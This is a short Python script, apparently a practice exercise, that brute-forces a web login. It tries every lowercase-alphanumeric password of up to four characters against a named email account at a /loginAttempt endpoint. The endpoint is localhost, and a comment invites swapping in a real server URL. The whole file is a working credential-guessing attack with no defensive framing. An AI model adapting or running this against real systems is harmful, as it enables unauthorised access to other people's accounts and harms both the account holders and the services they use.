import requests

characterList = "abcdefghijklmnopqrstuvwxyz0123456789"


def simulate_login(email, password):
    # replace with your actual server URL
    url = "http://localhost:5000/loginAttempt"
    data = {
        'email': email,
        'password': password
    }
    response = requests.post(url, data=data)
    print(response.text)
    return response.text


def generate_combinations(current, max_length, current_string):
    if current == max_length:
        return [current_string]
    else:
        combinations = []
        for char in characterList:
            combinations += generate_combinations(
                current + 1, max_length, current_string + char)
        return combinations


found = False
for current in range(1, 5):  # change range to start from 1, not 0
    if found:
        break
    for pw in generate_combinations(0, current, ""):  # use recursive function
        print('testing: ' + pw)
        response = simulate_login('jayne@collycorp.com.au', pw)
        if response != "Fail":
            found = True
            break
